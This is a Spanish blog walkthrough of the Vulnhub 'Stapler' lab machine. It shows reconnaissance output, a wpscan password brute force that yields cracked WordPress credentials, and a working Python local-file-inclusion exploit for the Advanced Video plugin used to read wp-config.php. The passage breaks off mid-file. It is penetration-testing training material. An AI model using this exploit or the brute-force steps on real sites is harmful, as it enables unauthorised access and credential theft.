---
layout: post
title: Stapler - Walkthrough
date: 2020-02-27 20:44
description: Walkthrough - Stapler
toc: true
comments: true
tags: 
 - OSCP
 - Walkthrough
 - Vulnhub

---

## **Walkthrough de Stapler**
---

## **Links**
[Stapler en Vulnhub](https://www.vulnhub.com/entry/stapler-1,150/)



## **Reconocimiento**
---
>**`nmap -T4 -p- 10.0.0.127`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 19:57 -03
Nmap scan report for 10.0.0.127
Host is up (0.00015s latency).
Not shown: 65523 filtered ports
PORT      STATE  SERVICE
20/tcp    closed ftp-data
21/tcp    open   ftp
22/tcp    open   ssh
53/tcp    open   domain
80/tcp    open   http
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
666/tcp   open   doom
3306/tcp  open   mysql
12380/tcp open   unknown
MAC Address: 08:00:27:E4:EF:87 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 96.56 seconds
```

>**`nmap -A -T4 -p20,21,22,53,80,123,137,138,139,666,3306,12380  10.0.0.127 -oA stapler`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 19:59 -03
Nmap scan report for 10.0.0.127
Host is up (0.00015s latency).

PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.0.122
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|   id.server: EZE
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: Speaks41ProtocolOld, SupportsTransactions, LongPassword, FoundRows, IgnoreSigpipes, Support41Auth, InteractiveClient, LongColumnFlag, Speaks41ProtocolNew, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \\x0C\x1E\x1B\x08S\x16<P2*\x01\x08\x7F PZA0\
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.80%I=7%D=2/20%Time=5E4F0F6B%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
SF:x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x
SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
SF:f\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\
SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\
SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\
SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\
SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak
SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\
SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f
SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
SF:[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x
SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f
SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4
SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 08:00:27:E4:EF:87 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3h00m01s, deviation: 0s, median: -3h00m01s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2020-02-20T20:00:07+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-20T20:00:08
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.15 ms 10.0.0.127

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.53 seconds
```
---

### **Protocolo FTP (21)**
---

Según **NMAP** la versión 2.0.8 de **vsftpd** está corriendo, una búsqueda en **searchsploit** no arroja muy lindos resultados así que no voy a ir por el lado de la vulnerabilidad con este servicio.

Haciendo una conexión con el comando ``ftp`` aparece un banner que también nos da un nombre de usuario, los voy anotando:

>**``ftp 10.0.0.127``**

```console
Connected to 10.0.0.127.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
```

Aparentemente el servidor FTP acepta conexiones anónimas así que si me logueé con el usuario y password **anonymous:anonymous** y encontré un archivo llamano **note** con el siguiente contenido:

```console
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```
Dos nombres de usuario más.

A seguir enumerando otros servicios por el momento...

---

### **Protocolo SSH (22)**
---
Aparece un nuevo banner:

>**``ssh 10.0.0.127``**

```console
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
```

---

### **Protocolo DNS (53)**
---
Hay un **dnsmasq 2.75** corriendo detrás del puerto 53, **searchsploit** devuelve resultados pero son todos DOS...

---

### **Protocolo SMB (139)**
---

>**``smbmap -H 10.0.0.127 -P 139``**

```console
[+] Finding open SMB ports....
[+] Guest RPC session established on 10.0.0.127...
[+] IP: 10.0.0.127:139	Name: red.initech                                       
	Disk                                                  	Permissions
	----                                                  	-----------
	print$                                            	NO ACCESS
	kathy                                             	READ ONLY
	tmp                                               	READ, WRITE
	IPC$                                              	NO ACCESS
```

Genial, las carpetas **tmp** y **Kathy**, a ver!!!

La carpeta **tmp** solo tiene un archivo llamado ``ls`` por ahora solo lo descargo. Creo que lo más jugoso está en la carpeta de **Kathy** donde existe una lista de to-do y un backup del supuesto sitio de **Wordpress** que anda corriendo por ahí en la máquina que estamos atacando. También existe un backup del archivo de configuración de **vsftpd**.

>**``smbclient \\\\10.0.0.127\\kathy``**

```console
cat todo-list.txt
I'm making sure to backup anything important for Initech, Kathy
```
---

### **Protocolo DOOM? (666)**
---

Extraño puerto, se dice por ahí que la gente de **Id Sofware** lo reservó para su juego **Doom**. Lo importante es que cuando se hace una conexión responde con algo que parece ser un archivo zip y se lo puede descargar con **Netcat**:

> **``nc 10.0.0.127 666 > message2.zip``**

---

Adentro del Zip hay una imagén en formato JPG y dice lo siguiente:

---

![img]({{ '/assets/images/Stapler/doom_00.png' | relative_url }}){: .center-image }*(IDDQK)*

---

La imagen descargada puede llegar a tener algo de esteganografía o dara una pista sobre un BOF (Se ve un Segmentation Fault) pero por ahora voy a dejar el analisis de este puerto acá.


---
### **Protocolo HTTP (80) o mejor dicho 12380**
---

En el puerto 80 no parecía haber mucho pero Apache también está respondiendo en el puerto 12380. Nikto encontró el archivo **Robots.txt** en la raíz del servidor con dos directorios:

 - /admin112233 (Una troleada que ejecuta una PoC de un XSS)
 - /blogblog (El teorico blog de la compañía montado sobre un Wordpress)
 - /phpmyadmin

---
>**``nikto -h 10.0.0.127 -port 12380``**

```console
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.127
+ Target Hostname:    10.0.0.127
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Start Time:         2020-02-20 20:14:20 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Hostname '10.0.0.127' does not match certificate's names: Red.Initech
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 8045 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-02-20 20:17:09 (GMT-3) (169 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
>**``dirb https://10.0.0.127:12380/blogblog``**

```console
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Feb 27 14:51:29 2020
URL_BASE: https://10.0.0.127:12380/blogblog/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://10.0.0.127:12380/blogblog/ ----
+ https://10.0.0.127:12380/blogblog/index.php (CODE:301|SIZE:0)                                                      
==> DIRECTORY: https://10.0.0.127:12380/blogblog/wp-admin/                                                           
==> DIRECTORY: https://10.0.0.127:12380/blogblog/wp-content/                                                         
==> DIRECTORY: https://10.0.0.127:12380/blogblog/wp-includes/                                                        
+ https://10.0.0.127:12380/blogblog/xmlrpc.php (CODE:405|SIZE:42)                                                    
                                                                                                                     
---- Entering directory: https://10.0.0.127:12380/blogblog/wp-admin/ ----
+ https://10.0.0.127:12380/blogblog/wp-admin/admin.php (CODE:302|SIZE:0)                                             
==> DIRECTORY: https://10.0.0.127:12380/blogblog/wp-admin/css/                                                       
==> DIRECTORY: https://10.0.0.127:12380/blogblog/wp-admin/images/                                                    
==> DIRECTORY: https://10.0.0.127:12380/blogblog/wp-admin/includes/                                                  
+ https://10.0.0.127:12380/blogblog/wp-admin/index.php (CODE:302|SIZE:0)                                             
==> DIRECTORY: https://10.0.0.127:12380/blogblog/wp-admin/js/                                                        
==> DIRECTORY: https://10.0.0.127:12380/blogblog/wp-admin/maint/                                                     
==> DIRECTORY: https://10.0.0.127:12380/blogblog/wp-admin/network/                                                   
==> DIRECTORY: https://10.0.0.127:12380/blogblog/wp-admin/user/                                                      
                                                                                                                     
---- Entering directory: https://10.0.0.127:12380/blogblog/wp-content/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: https://10.0.0.127:12380/blogblog/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: https://10.0.0.127:12380/blogblog/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: https://10.0.0.127:12380/blogblog/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: https://10.0.0.127:12380/blogblog/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: https://10.0.0.127:12380/blogblog/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: https://10.0.0.127:12380/blogblog/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: https://10.0.0.127:12380/blogblog/wp-admin/network/ ----
+ https://10.0.0.127:12380/blogblog/wp-admin/network/admin.php (CODE:302|SIZE:0)                                     
+ https://10.0.0.127:12380/blogblog/wp-admin/network/index.php (CODE:302|SIZE:0)                                     
                                                                                                                     
---- Entering directory: https://10.0.0.127:12380/blogblog/wp-admin/user/ ----
+ https://10.0.0.127:12380/blogblog/wp-admin/user/admin.php (CODE:302|SIZE:0)                                        
+ https://10.0.0.127:12380/blogblog/wp-admin/user/index.php (CODE:302|SIZE:0)                                        
                                                                                                                     
-----------------
END_TIME: Thu Feb 27 14:51:36 2020
DOWNLOADED: 18448 - FOUND: 8

```

---

>**``wpscan -v --url https://10.0.0.127:12380/blogblog/ --disable-tls-checks``**

```console
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.5.3
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: https://10.0.0.127:12380/blogblog/
[+] Started: Thu Feb 20 20:33:35 2020

Interesting Finding(s):

[+] https://10.0.0.127:12380/blogblog/
 | Interesting Entries:
 |  - Server: Apache/2.4.18 (Ubuntu)
 |  - Dave: Soemthing doesn't look right here
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] https://10.0.0.127:12380/blogblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] https://10.0.0.127:12380/blogblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: https://10.0.0.127:12380/blogblog/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://10.0.0.127:12380/blogblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] https://10.0.0.127:12380/blogblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
 | Detected By: Rss Generator (Passive Detection)
 |  - https://10.0.0.127:12380/blogblog/?feed=rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
 |  - https://10.0.0.127:12380/blogblog/?feed=comments-rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
 |
 | [!] 65 vulnerabilities identified:
 |
 | [!] Title: WordPress 4.1-4.2.1 - Unauthenticated Genericons Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7979
 |      - https://codex.wordpress.org/Version_4.2.2
 |
 | [!] Title: WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8111
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
 |      - https://wordpress.org/news/2015/07/wordpress-4-2-3/
 |      - https://twitter.com/klikkioy/status/624264122570526720
 |      - https://klikki.fi/adv/wordpress3.html
 |
 | [!] Title: WordPress <= 4.2.3 - wp_untrash_post_comments SQL Injection 
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8126
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2213
 |      - https://github.com/WordPress/WordPress/commit/70128fe7605cb963a46815cf91b0a5934f70eff5
 |
 | [!] Title: WordPress <= 4.2.3 - Timing Side Channel Attack
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8130
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5730
 |      - https://core.trac.wordpress.org/changeset/33536
 |
 | [!] Title: WordPress <= 4.2.3 - Widgets Title Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.4
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8131
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5732
 |      - https://core.trac.wordpress.org/changeset/33529
 |
 | [CANTIDAD ABSURDA DE VULNERABILIDADES]

[+] WordPress theme in use: bhost
 | Location: https://10.0.0.127:12380/blogblog/wp-content/themes/bhost/
 | Last Updated: 2018-01-10T00:00:00.000Z
 | Readme: https://10.0.0.127:12380/blogblog/wp-content/themes/bhost/readme.txt
 | [!] The version is out of date, the latest version is 1.4.0
 | Style URL: https://10.0.0.127:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1
 | Style Name: BHost
 | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme made with Latest Bootstrap v3.3.5. You can use it for your corporate , personal , blog sites etc.
 | Author: Masum Billah
 | Author URI: http://getmasum.net/
 | License: GNU General Public License v2 or later
 | License URI: http://www.gnu.org/licenses/gpl-2.0.html
 | Tags: light, gray, white, one-column, two-columns, right-sidebar, fluid-layout, responsive-layout, custom-menu, featured-images, flexible-header, sticky-post, translation-ready, full-width-template
 | Text Domain: bhost
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 1.2.9 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - https://10.0.0.127:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: 'Version: 1.2.9'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=========================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.


[+] Finished: Thu Feb 20 20:33:41 2020
[+] Requests Done: 50
[+] Cached Requests: 5
[+] Data Sent: 9.606 KB
[+] Data Received: 137.83 KB
[+] Memory used: 194.059 MB
[+] Elapsed time: 00:00:05
```
---

Lo más significativo que encontró **WPScan** fueron la posibilidad de crear un usuario (Sin privilegios así que no sirve mucho) y un Plugin de Wordpress que tiene una vulnerabilidad.

Antes de tratar de explotar el Plugin quiero enumerar usuarios y Plugins con WPScan:

```console
[i] User(s) Identified:

[+] John Smith
 | Detected By: Author Posts - Display Name (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)

[+] barry
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] elly
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] peter
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] heather
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] garry
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] harry
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] scott
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] kathy
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tim
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

---


>**``wpscan -U users.txt -P /usr/share/wordlists/rockyou.txt -v --url https://10.0.0.127:12380/blogblog/ --disable-tls-checks``**

```console
[+] Performing password attack on Xmlrpc Multicall against 17 user/s
[SUCCESS] - Harry / monkey                                                                                            
[SUCCESS] - Garry / football                                                                                          
[SUCCESS] - Scott / cookie
[SUCCESS] - Kathy / coolgirl
[SUCCESS] - Barry / washere                                                                                           
[SUCCESS] - Tim / thumb                                                                                               
[SUCCESS] - Pam / 0520
```

No logré mucho así que volviendo al Plugin vulnerable:

>**``searchsploit advanced video``**

---

```console
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
                                                                             | (/usr/share/exploitdb/)
----------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Advanced Video 1.0 - Local File Inclusion                   | exploits/php/webapps/39646.py
----------------------------------------------------------------------------- ---------------------------------
```

LFI!!! Perfecto!!

Tuve que toquetear un poco el código y Kali para que funcionara pero cuando lo hizo no pasó nada. Tardé horas en darme cuenta que cada vez que ejecutaba el script y era exitoso se creaba un post en el blog con un archivo de imagen .JPG.

Eso combinado con el directorio **uploads** que era browseable según **WPScan** me permitieron descargar el .JPG que en realidad era un archivo de texto con el contenido del **wp-config.php**. Con un poco de suerte se puede encontrar el password de la DB dentro de ese archivo...

---
```python
import random
import urllib2
import re
import ssl

url = "https://10.0.0.127:12380/blogblog" # insert url to wordpress

randomID = long(random.random() * 100000000000000000L)

objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rn$
content =  objHtml.readlines()
for line in content:
        numbers = re.findall(r'\d+',line)
        id = numbers[-1]
        id = int(id) / 10

objHtml = urllib2.urlopen(url + '/?p=' + str(id))
content = objHtml.readlines()

for line in content:
        if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line:
                urls=re.findall('"(https?://.*?)"', line)
                print urllib2.urlopen(urls[0]).read()
```
> No me creo que lo hice funcinar.

Ojo que va a tirar error de SSL por ser HTTPS la página que queremos acceder y tener un certificadao de no confianza. Para salvaguardar este problema de la manera más rápida pero desprolija hay que correr el siguiente comando:

---

>**``export PYTHONHTTPSVERIFY=0``**

---

Después de la ejecución satisfactoria se puede descargar cualquier archivo que esté en la carpeta de **uploads**:

>**``wget https://10.0.0.127:12380/blogblog/wp-content/uploads/1781004358.jpeg --no-check-certificate``**

y luego...

>**``cat 1781004358.jpeg ``**

```php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
